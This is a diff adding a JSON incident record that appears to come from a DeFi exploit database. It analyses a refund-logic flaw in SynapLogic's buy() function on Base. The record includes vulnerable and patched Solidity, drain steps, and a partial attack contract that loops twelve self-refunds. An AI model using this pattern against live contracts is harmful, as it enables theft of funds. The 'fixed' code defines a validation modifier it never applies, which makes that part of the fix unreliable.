@@ -1,0 +1,27 @@
+{
+ "id": "2026__2026-01-20_SynapLogic_BusinessLogicFlaw",
+ "source_file": "2026/2026-01-20_SynapLogic_BusinessLogicFlaw.md",
+ "title": "SynapLogic — Business Logic Flaw in Refund Mechanism Analysis",
+ "date": "2026-01-20",
+ "protocol": "SynapLogic",
+ "chain": "Base",
+ "loss_raw": "~27.6 ETH + ~3,450 USDC",
+ "loss_usd": null,
+ "root_cause": "The refund mechanism in the `buy()` function allows repeated refunds exceeding the original payment amount when combining multiple recipients/rates/refund flag combinations",
+ "attack_tx": null,
+ "vulnerable_contract": "0xC859aC8429fB4A5E24F24a7BEd3fE3a8Db4fb371 (SynapLogic Sale, implementation)",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable: independent refund per iteration → total refund can exceed original payment\nfunction buy(\n    address[] calldata recipients,\n    uint256[] calldata rates,\n    bool[] calldata refundFlags\n) external payable {\n    uint256 value = msg.value;\n\n    for (uint256 i = 0; i < recipients.length; i++) {\n        // Token distribution logic\n        uint256 tokenAmount = value * rates[i] / 100;\n        _mint(recipients[i], tokenAmount);\n\n        if (refundFlags[i]) {\n            // ❌ Refunds 10% of value on every iteration\n            // 10 recipients → value * 10% * 10 = full refund of value\n            // 11 recipients → value * 10% * 11 > value (excess refund)\n            uint256 refundAmount = value * 10 / 100;\n            payable(recipients[i]).transfer(refundAmount);\n        }\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed: track total refunded to prevent exceeding payment amount\nfunction buy(\n    address[] calldata recipients,\n    uint256[] calldata rates,\n    bool[] calldata refundFlags\n) external payable {\n    uint256 value = msg.value;\n    uint256 totalRefunded = 0;  // ✅ Track total refunded amount\n\n    for (uint256 i = 0; i < recipients.length; i++) {\n        uint256 tokenAmount = value * rates[i] / 100;\n        _mint(recipients[i], tokenAmount);\n\n        if (refundFlags[i]) {\n            uint256 refundAmount = value * 10 / 100;\n            // ✅ Prevent total refund from exceeding payment\n            require(\n                totalRefunded + refundAmount <= value,\n                \"Total refund exceeds payment\"\n            );\n            totalRefunded += refundAmount;\n            payable(recipients[i]).transfer(refundAmount);\n        }\n    }\n}\n\n// ✅ Added: input array length validation\nmodifier validArrayLengths(\n    address[] calldata recipients,\n    uint256[] calldata rates,\n    bool[] calldata refundFlags\n) {\n    require(\n        recipients.length == rates.length &&\n        rates.length == refundFlags.length,\n        \"Array length mismatch\"\n    );\n    require(recipients.length <= 10, \"Too many recipients\"); // ✅ Max 10 recipients\n    _;\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1] Confirm SynapLogic contract balance: N ETH + M USDC\n  │\n  ├─[2] Craft manipulated buy() function parameters\n  │       recipients = [addr1, addr2, ..., addr12] (12 entries)\n  │       rates     = [8, 8, 8, ...]\n  │       refundFlags = [true, true, true, ...]  (all refund enabled)\n  │\n  ├─[3] Call buy() with small ETH payment (e.g., 0.1 ETH)\n  │       ┌─ Iteration 1:  refund = 0.1 ETH * 10% = 0.01 ETH\n  │       ├─ Iteration 2:  refund = 0.1 ETH * 10% = 0.01 ETH\n  │       ├─ ...\n  │       └─ Iteration 12: refund = 0.1 ETH * 10% = 0.01 ETH\n  │       Total refund = 0.12 ETH > 0.1 ETH (exceeds payment!)\n  │\n  ├─[4] Repeat\n  │       Repeatedly call buy() to drain all contract ETH\n  │\n  ├─[5] Execute same pattern for USDC\n  │       Use USDC refundFlags to drain USDC balance\n  │",
+  "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface ISynapLogic {\n    function buy(\n        address[] calldata recipients,\n        uint256[] calldata rates,\n        bool[] calldata refundFlags\n    ) external payable;\n}\n\ncontract SynapLogicAttack {\n    ISynapLogic constant target = ISynapLogic(0x...);\n\n    function attack() external payable {\n        // Set 12 recipients to trigger 120% refund\n        address[] memory recipients = new address[](12);\n        uint256[] memory rates = new uint256[](12);\n        bool[] memory refundFlags = new bool[](12);\n\n        for (uint256 i = 0; i < 12; i++) {\n            recipients[i] = address(this); // Receive refunds at attacker address\n            rates[i] = 8;                  // Token rate (96% total)\n            refundFlags[i] = true"
+ ]
+}
